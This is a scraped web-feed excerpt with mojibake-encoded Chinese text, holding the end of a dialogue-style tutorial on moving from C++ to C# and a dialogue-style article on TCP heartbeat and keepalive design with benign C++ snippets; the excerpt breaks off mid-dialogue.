    <span class="hljs-tag">&lt;<span class="hljs-name">PackageReference</span> <span class="hljs-attr">Include</span>=<span class="hljs-string">"AutoMapper"</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">"10.1.1"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ItemGroup</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Project</span>&gt;</span>
</code></pre>
<p><strong>ç‹å“¥</strong>ï¼šç»™ä½ çš„<strong>æ—¥å¸¸æ£€æŸ¥æ¸…å•</strong>ï¼š</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> ä»£ç ä¸­æ˜¯å¦è¿˜æœ‰<code>public</code>å­—æ®µï¼Ÿï¼ˆåº”è¯¥ç”¨å±æ€§ï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦å®ç°äº†<code>IDisposable</code>ï¼Ÿï¼ˆå¦‚æœæœ‰éæ‰˜ç®¡èµ„æºï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å¼‚æ­¥æ–¹æ³•æ˜¯å¦ä»¥<code>Async</code>ç»“å°¾ï¼Ÿ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦å¤„ç†äº†å¯èƒ½çš„<code>null</code>ï¼Ÿ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦ä½¿ç”¨äº†åˆé€‚çš„é›†åˆç±»å‹ï¼Ÿ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å­—ç¬¦ä¸²æ¯”è¾ƒæ˜¯å¦æŒ‡å®šäº†æ¯”è¾ƒè§„åˆ™ï¼Ÿ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é¿å…äº†è£…ç®±æ‹†ç®±ï¼Ÿ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦ç”¨äº†<code>using</code>ç®¡ç†èµ„æºï¼Ÿ</li>
</ul>
<h2 data-id="heading-14">æœ€åçš„å¿ å‘Š</h2>
<p><strong>ç‹å“¥</strong>ï¼šå°æï¼Œè½¬å‹æœ€å¤§çš„éšœç¢ä¸æ˜¯æŠ€æœ¯ï¼Œè€Œæ˜¯<strong>æ€ç»´ä¹ æƒ¯</strong>ã€‚ä½ éœ€è¦ï¼š</p>
<ol>
<li><strong>ä»æ§åˆ¶ç‹‚åˆ°ä¿¡ä»»è€…</strong>ï¼šç›¸ä¿¡GCï¼Œç›¸ä¿¡æ¡†æ¶</li>
<li><strong>ä»æ‰‹åŠ¨æŒ¡åˆ°è‡ªåŠ¨æŒ¡</strong>ï¼šè®©å·¥å…·ä¸ºä½ å·¥ä½œ</li>
<li><strong>ä»å¾®è§‚åˆ°å®è§‚</strong>ï¼šå…³æ³¨ä¸šåŠ¡é€»è¾‘è€Œä¸æ˜¯å†…å­˜å¸ƒå±€</li>
<li><strong>ä»å¤æ‚åˆ°ç®€æ´</strong>ï¼šåˆ©ç”¨ç°ä»£è¯­è¨€ç‰¹æ€§</li>
</ol>
<p><strong>å°æ</strong>ï¼šæ„Ÿè§‰è¦å­¦çš„å¥½å¤šå•Šï¼</p>
<p><strong>ç‹å“¥</strong>ï¼šåˆ«æ€¥ï¼Œæˆ‘ç»™ä½ ä¸€ä¸ª<strong>30å¤©å­¦ä¹ è®¡åˆ’</strong>ï¼š</p>
<p><strong>ç¬¬1å‘¨</strong>ï¼šæŒæ¡åŸºç¡€</p>
<ul>
<li>å€¼ç±»å‹vså¼•ç”¨ç±»å‹</li>
<li>å±æ€§vså­—æ®µ</li>
<li>åŸºæœ¬é›†åˆä½¿ç”¨</li>
</ul>
<p><strong>ç¬¬2å‘¨</strong>ï¼šæ·±å…¥æ ¸å¿ƒ</p>
<ul>
<li>async/await</li>
<li>LINQåŸºç¡€</li>
<li>å¼‚å¸¸å¤„ç†</li>
</ul>
<p><strong>ç¬¬3å‘¨</strong>ï¼šç°ä»£ç‰¹æ€§</p>
<ul>
<li>æ¨¡å¼åŒ¹é…</li>
<li>è®°å½•ç±»å‹</li>
<li>å¯ç©ºå¼•ç”¨ç±»å‹</li>
</ul>
<p><strong>ç¬¬4å‘¨</strong>ï¼šç”Ÿæ€ç³»ç»Ÿ</p>
<ul>
<li>Entity Framework</li>
<li>ASP.NET CoreåŸºç¡€</li>
<li>ä¾èµ–æ³¨å…¥</li>
</ul>
<p>è®°ä½ï¼Œ<strong>ä¸è¦è¯•å›¾ä¸€æ¬¡æ€§æŒæ¡æ‰€æœ‰ä¸œè¥¿</strong>ã€‚å†™ä»£ç æ—¶é‡åˆ°é—®é¢˜å†æŸ¥ï¼Œå®è·µä¸­å­¦ä¹ æœ€å¿«ã€‚æœ‰é—®é¢˜éšæ—¶é—®æˆ‘ï¼</p>
<p><strong>å°æ</strong>ï¼šå¤ªæ„Ÿè°¢äº†ï¼æˆ‘ç°åœ¨æ˜ç™½å¤šäº†ã€‚æˆ‘ä¼šå…ˆä»æ”¹æ‰C++çš„ä¹ æƒ¯å¼€å§‹ã€‚</p>
<p><strong>ç‹å“¥</strong>ï¼šå¯¹äº†ï¼Œæœ€åé€ä½ ä¸€å¥è¯ï¼š<strong>"å†™C#ä»£ç ï¼Œä¸è¦ç”¨C++æ€ç»´"</strong>ã€‚ç¥ä½ è½¬å‹é¡ºåˆ©ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TCPå¿ƒè·³æœºåˆ¶ï¼šçœ‹ä¸è§çš„â€œç”Ÿå‘½çº¿â€]]></title>    <link>https://juejin.cn/post/7594791357144629290</link>    <guid>https://juejin.cn/post/7594791357144629290</guid>    <pubDate>2026-01-14T14:12:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144629290" data-draft-id="7595043440520118278" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TCPå¿ƒè·³æœºåˆ¶ï¼šçœ‹ä¸è§çš„â€œç”Ÿå‘½çº¿â€"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:12:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TCPå¿ƒè·³æœºåˆ¶ï¼šçœ‹ä¸è§çš„â€œç”Ÿå‘½çº¿â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:12:59.000Z" title="Wed Jan 14 2026 14:12:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æˆ‘</strong>ï¼šï¼ˆå‡Œæ™¨2ç‚¹è¢«ç”µè¯åµé†’ï¼‰â€œå–‚...æ€ä¹ˆäº†ï¼Ÿâ€</p>
<p><strong>è¿ç»´åŒäº‹</strong>ï¼šâ€œç‹å·¥ï¼Œå’±ä»¬çš„åœ¨çº¿æ¸¸æˆæœåŠ¡å™¨åˆæŒ‚äº†ï¼äº”ä¸‡ç©å®¶çªç„¶é›†ä½“æ‰çº¿ï¼â€</p>
<p><strong>æˆ‘</strong>ï¼šï¼ˆç¬é—´æ¸…é†’ï¼‰â€œä»€ä¹ˆï¼Ÿè¿æ¥æ•°ä¸æ˜¯ä¸€ç›´å¾ˆç¨³å®šå—ï¼Ÿâ€</p>
<p><strong>åŒäº‹</strong>ï¼šâ€œå°±æ˜¯å•Šï¼æµé‡ç›‘æ§æ˜¾ç¤ºä¸€åˆ‡æ­£å¸¸ï¼Œä½†ç©å®¶å°±æ˜¯è¿ä¸ä¸Šã€‚NATç½‘å…³æ—¥å¿—æ˜¾ç¤ºæ‰€æœ‰é•¿è¿æ¥éƒ½è¢«æ¸…ç©ºäº†...â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œå¿ƒè·³æœºåˆ¶æ²¡ç”Ÿæ•ˆï¼Ÿâ€</p>
<p><strong>åŒäº‹</strong>ï¼šâ€œå•Šï¼Ÿå¿ƒè·³ï¼Ÿæˆ‘ä»¬TCPä¸æ˜¯å·²ç»å»ºç«‹è¿æ¥äº†å—ï¼Ÿâ€</p>
<hr/>
<h2 data-id="heading-0">ç¬¬ä¸€é—®ï¼šTCPä¸æ˜¯å·²ç»å»ºç«‹è¿æ¥äº†å—ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦å¿ƒè·³ï¼Ÿ</h2>
<h3 data-id="heading-1">å¯¹è¯é‡ç°ï¼š</h3>
<p><strong>æ–°äººå°æ</strong>ï¼šâ€œç‹å“¥ï¼Œæˆ‘æœ‰ä¸ªé—®é¢˜æƒ³ä¸é€šã€‚TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥åï¼Œä¸æ˜¯å°±æœ‰äº†ä¸€æ¡å¯é çš„é€šé“å—ï¼Ÿä¸ºä»€ä¹ˆè¿˜è¦é¢å¤–æä¸ªå¿ƒè·³æœºåˆ¶ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œå¥½é—®é¢˜ï¼æƒ³è±¡ä¸€ä¸‹è¿™ä¸ªåœºæ™¯ï¼šä½ æ­£åœ¨å’Œè¿œæ–¹çš„æœ‹å‹æ‰“ç”µè¯ï¼Œçªç„¶ä»–çš„æ‰‹æœºæ²¡ç”µè‡ªåŠ¨å…³æœºäº†ã€‚â€</p>
<p><strong>å°æ</strong>ï¼šâ€œé‚£æˆ‘è¿™è¾¹ä¼šå¬åˆ°å¿™éŸ³æˆ–è€…ç›´æ¥æ–­çº¿ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œåœ¨ç”µè¯é‡Œæ˜¯çš„ï¼Œä½†åœ¨TCPä¸–ç•Œé‡Œï¼Œä½ å¯èƒ½æ°¸è¿œä¸çŸ¥é“å¯¹æ–¹å·²ç»â€˜æ¶ˆå¤±â€™äº†ã€‚TCPè¿æ¥å»ºç«‹åï¼Œå¦‚æœå¯¹ç«¯çªç„¶å´©æºƒã€ç½‘ç»œä¸­é—´è®¾å¤‡é‡å¯ï¼Œæˆ–è€…NATç½‘å…³è¶…æ—¶ï¼Œä½ çš„TCPè¿æ¥åœ¨æœ¬åœ°çœ‹æ¥ä¾ç„¶æ˜¯â€˜ESTABLISHEDâ€™çŠ¶æ€ã€‚â€</p>
<p><strong>å°æ</strong>ï¼šâ€œç­‰ç­‰ï¼ŒTCPä¸æ˜¯æœ‰è¶…æ—¶é‡ä¼ æœºåˆ¶å—ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæ²¡é”™ï¼Œä½†é‡ä¼ è¶…æ—¶é€šå¸¸æ˜¯åˆ†é’Ÿçº§åˆ«çš„ã€‚RFCé‡Œè§„å®šçš„RTOæœ€å°å€¼æ˜¯1ç§’ï¼Œæœ€å¤§å¯èƒ½åˆ°å‡ åˆ†é’Ÿã€‚è€Œä¸”ï¼Œå¦‚æœä¸­é—´è·¯ç”±å™¨æŠŠè¿æ¥é‡ç½®äº†ï¼Œä½†é‡ç½®åŒ…ä¸¢å¤±äº†å‘¢ï¼Ÿâ€</p>
<h3 data-id="heading-2">æŠ€æœ¯å†…å¹•ï¼š</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨ - TCPè¿æ¥çŠ¶æ€</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">tcp_state</span> {
    TCP_ESTABLISHED = <span class="hljs-number">1</span>,  <span class="hljs-comment">// è¿æ¥å»ºç«‹</span>
    TCP_CLOSE_WAIT = <span class="hljs-number">8</span>,   <span class="hljs-comment">// è¢«åŠ¨å…³é—­</span>
    <span class="hljs-comment">// ... ä½†æ²¡æœ‰"å¯¹æ–¹å·²æ­»ä½†æˆ‘ä¸çŸ¥é“"çš„çŠ¶æ€</span>
};

<span class="hljs-comment">// å®é™…åœºæ™¯</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">check_connection</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span> </span>{
    <span class="hljs-comment">// å³ä½¿å¯¹ç«¯å·²å´©æºƒï¼Œè¿™ä¸ªæ£€æŸ¥å¯èƒ½ä»ç„¶è¿”å›æˆåŠŸ</span>
    <span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;
    <span class="hljs-type">socklen_t</span> len = <span class="hljs-built_in">sizeof</span>(error);
    <span class="hljs-built_in">getsockopt</span>(sockfd, SOL_SOCKET, SO_ERROR, &amp;error, &amp;len);
    <span class="hljs-keyword">return</span> error == <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¯èƒ½è¿”å›trueï¼Œå³ä½¿è¿æ¥å®é™…å·²å¤±æ•ˆ</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-3">ç¬¬äºŒé—®ï¼šTCPä¸æ˜¯æœ‰Keepaliveé€‰é¡¹å—ï¼Ÿç›´æ¥ç”¨ä¸å°±è¡Œäº†ï¼Ÿ</h2>
<h3 data-id="heading-4">å¯¹è¯é‡ç°ï¼š</h3>
<p><strong>æ¶æ„å¸ˆè€å¼ </strong>ï¼šâ€œå°ç‹ï¼Œæˆ‘çœ‹ä½ åˆåœ¨å®ç°åº”ç”¨å±‚å¿ƒè·³ã€‚ç³»ç»Ÿä¸æ˜¯æœ‰TCP Keepaliveå—ï¼Ÿåˆ«é‡å¤é€ è½®å­ã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œå¼ æ€»ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä»¬å®æµ‹è¿‡ã€‚ä¸Šå‘¨å’±ä»¬çš„ç§»åŠ¨ç«¯APPï¼Œåœ¨4Gç½‘ç»œä¸‹ï¼ŒTCP Keepaliveå®Œå…¨å¤±æ•ˆäº†ã€‚â€</p>
<p><strong>è€å¼ </strong>ï¼šâ€œå¤±æ•ˆï¼Ÿæ€ä¹ˆå¯èƒ½ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæˆ‘ä»¬æŠ“åŒ…åˆ†æå‘ç°ï¼Œè¿è¥å•†çš„GGSNç½‘å…³ä¼šæŠŠTCP KeepaliveåŒ…è¿‡æ»¤æ‰ã€‚è€Œä¸”ï¼ŒLinuxé»˜è®¤è®¾ç½®æ˜¯7200ç§’åå¼€å§‹æ¢æµ‹ï¼Œå¯¹å®æ—¶åº”ç”¨æ¥è¯´ï¼Œä¸¤å°æ—¶å¤ªé•¿äº†ã€‚â€</p>
<h3 data-id="heading-5">å®æµ‹æ•°æ®å¯¹æ¯”ï¼š</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ä¸åŒåœºæ™¯ä¸‹çš„å¿ƒè·³éœ€æ±‚å¯¹æ¯”è¡¨</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HeartbeatRequirement</span> {
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* scenario;      <span class="hljs-comment">// åœºæ™¯</span>
    <span class="hljs-type">int</span> max_allowed_gap;       <span class="hljs-comment">// å…è®¸çš„æœ€å¤§é—´éš”ï¼ˆç§’ï¼‰</span>
    <span class="hljs-type">bool</span> tcp_keepalive_works;  <span class="hljs-comment">// TCP Keepaliveæ˜¯å¦æœ‰æ•ˆ</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* reason;        <span class="hljs-comment">// åŸå› </span>
};

HeartbeatRequirement requirements[] = {
    {<span class="hljs-string">"ç§»åŠ¨4G/5Gç½‘ç»œ"</span>,     <span class="hljs-number">20</span>,  <span class="hljs-literal">false</span>, <span class="hljs-string">"è¿è¥å•†è¿‡æ»¤KeepaliveåŒ…"</span>},
    {<span class="hljs-string">"ä¼ä¸šNATç½‘å…³"</span>,       <span class="hljs-number">300</span>, <span class="hljs-literal">true</span>,  <span class="hljs-string">"é»˜è®¤5åˆ†é’Ÿè¶…æ—¶"</span>},
    {<span class="hljs-string">"é˜¿é‡Œäº‘SLB"</span>,         <span class="hljs-number">60</span>,  <span class="hljs-literal">false</span>, <span class="hljs-string">"ä¼šè¯è¶…æ—¶è®¾ç½®"</span>},
    {<span class="hljs-string">"æ¸¸æˆæœåŠ¡å™¨"</span>,         <span class="hljs-number">30</span>,  <span class="hljs-literal">false</span>, <span class="hljs-string">"ç©å®¶ä½“éªŒè¦æ±‚"</span>},
    {<span class="hljs-string">"é‡‘èäº¤æ˜“ç³»ç»Ÿ"</span>,       <span class="hljs-number">10</span>,  <span class="hljs-literal">false</span>, <span class="hljs-string">"åˆè§„è¦æ±‚"</span>},
    {<span class="hljs-string">"IoTè®¾å¤‡"</span>,           <span class="hljs-number">120</span>, <span class="hljs-literal">true</span>,  <span class="hljs-string">"çœç”µæ¨¡å¼é™åˆ¶"</span>}
};
</code></pre>
<hr/>
<h2 data-id="heading-6">ç¬¬ä¸‰é—®ï¼šå¿ƒè·³åŒ…ä¼šä¸ä¼šé€ æˆç½‘ç»œæ‹¥å¡ï¼Ÿ</h2>
<h3 data-id="heading-7">å¯¹è¯é‡ç°ï¼š</h3>
<p><strong>æµ‹è¯•å·¥ç¨‹å¸ˆå°åˆ˜</strong>ï¼šâ€œç‹å“¥ï¼Œæˆ‘ä»¬å‹åŠ›æµ‹è¯•æ—¶å‘ç°ï¼Œå¿ƒè·³åŒ…å äº†æ€»æµé‡çš„30%ï¼è¿™æ­£å¸¸å—ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œå½“ç„¶ä¸æ­£å¸¸ï¼ä½ ä»¬æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿâ€</p>
<p><strong>å°åˆ˜</strong>ï¼šâ€œå°±æ˜¯æ¯ä¸ªè¿æ¥æ¯ç§’å‘ä¸€ä¸ªå¿ƒè·³åŒ…å•Šã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šï¼ˆæ‰¶é¢ï¼‰â€œæ¯ç§’ï¼Ÿå’±ä»¬æœ‰åä¸‡å¹¶å‘è¿æ¥ï¼Œæ¯ä¸ªå¿ƒè·³åŒ…å°±ç®—åªæœ‰10å­—èŠ‚ï¼Œç®—ç®—å¸¦å®½...â€</p>
<p><strong>å°åˆ˜</strong>ï¼šâ€œ10å­—èŠ‚ Ã— 10ä¸‡è¿æ¥ Ã— 8ä½ Ã— 1ç§’ = 8Mbpsï¼Ÿå¤©å“ªï¼â€</p>
<h3 data-id="heading-8">ä¼˜åŒ–æ–¹æ¡ˆå¯¹è¯ï¼š</h3>
<p><strong>æˆ‘</strong>ï¼šâ€œå¿ƒè·³è®¾è®¡æœ‰ä¸‰ä¸ªåŸåˆ™ï¼šå¤Ÿç”¨ã€ç»æµã€æ™ºèƒ½ã€‚â€</p>
<p><strong>å°åˆ˜</strong>ï¼šâ€œæ€ä¹ˆä¸ªæ™ºèƒ½æ³•ï¼Ÿâ€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œæ¯”å¦‚åŠ¨æ€å¿ƒè·³é—´éš”ã€‚è¿æ¥åˆšå»ºç«‹æ—¶å¯†é›†ä¸€äº›ï¼Œç¨³å®šåæ‹‰é•¿é—´éš”ã€‚è¿˜æœ‰â€˜æå¸¦ç¡®è®¤â€™â€”â€”æœ‰ä¸šåŠ¡æ•°æ®æ—¶å°±ä¸å‘ç‹¬ç«‹å¿ƒè·³åŒ…ã€‚â€</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartHeartbeat</span> {
<span class="hljs-keyword">private</span>:
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calculate_interval</span><span class="hljs-params">(<span class="hljs-type">const</span> ConnectionStats&amp; stats)</span> </span>{
        <span class="hljs-comment">// åŸºäºç½‘ç»œè´¨é‡åŠ¨æ€è°ƒæ•´</span>
        <span class="hljs-keyword">if</span> (stats.rtt &gt; <span class="hljs-number">1000</span>) {          <span class="hljs-comment">// é«˜å»¶è¿Ÿç½‘ç»œ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">60</span>;                   <span class="hljs-comment">// 60ç§’</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stats.packet_loss &gt; <span class="hljs-number">0.1</span>) { <span class="hljs-comment">// é«˜ä¸¢åŒ…ç‡</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">30</span>;                   <span class="hljs-comment">// 30ç§’</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_mobile_network</span>()) { <span class="hljs-comment">// ç§»åŠ¨ç½‘ç»œ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">45</span>;                   <span class="hljs-comment">// 45ç§’ï¼ˆè€ƒè™‘NATè¶…æ—¶ï¼‰</span>
        } <span class="hljs-keyword">else</span> {                         <span class="hljs-comment">// ç¨³å®šç½‘ç»œ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">180</span>;                  <span class="hljs-comment">// 3åˆ†é’Ÿ</span>
        }
    }
    
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">should_piggyback</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// å¦‚æœæœ€è¿‘æœ‰æ•°æ®äº¤äº’ï¼Œå¯ä»¥è·³è¿‡è¿™æ¬¡å¿ƒè·³</span>
        <span class="hljs-keyword">auto</span> now = std::chrono::steady_clock::<span class="hljs-built_in">now</span>();
        <span class="hljs-keyword">auto</span> elapsed = std::chrono::<span class="hljs-built_in">duration_cast</span>&lt;std::chrono::seconds&gt;(
            now - last_data_time_);
        <span class="hljs-keyword">return</span> elapsed.<span class="hljs-built_in">count</span>() &lt; heartbeat_interval_ / <span class="hljs-number">2</span>;
    }
};
</code></pre>
<hr/>
<h2 data-id="heading-9">ç¬¬å››é—®ï¼šå¿ƒè·³æœºåˆ¶å¦‚ä½•åº”å¯¹å¤æ‚çš„ç½‘ç»œç¯å¢ƒï¼Ÿ</h2>
<h3 data-id="heading-10">çœŸå®æ¡ˆä¾‹è®¨è®ºï¼š</h3>
<p><strong>å®¢æˆ·</strong>ï¼šâ€œæˆ‘ä»¬çš„è½¦è”ç½‘è®¾å¤‡ç»å¸¸åœ¨éš§é“é‡Œå¤±è”ï¼Œå‡ºæ¥åé‡è¿å¾ˆæ…¢ã€‚â€</p>
<p><strong>æˆ‘</strong>ï¼šâ€œéš§é“åœºæ™¯å¾ˆå…¸å‹ã€‚GPSä¿¡å·ä¸¢å¤±ã€ç½‘ç»œåˆ‡æ¢ã€ä¿¡å·è¡°å‡...å¿ƒè·³æœºåˆ¶åœ¨è¿™é‡Œç‰¹åˆ«å…³é”®ã€‚â€</p>
<p><strong>å®¢æˆ·</strong>ï¼šâ€œä½†è®¾å¤‡åœ¨éš§é“é‡Œæœ¬æ¥å°±æ²¡ä¿¡å·å•Šï¼Œå‘å¿ƒè·³ä¸æ˜¯æµªè´¹ç”µå—ï¼Ÿâ€</p>
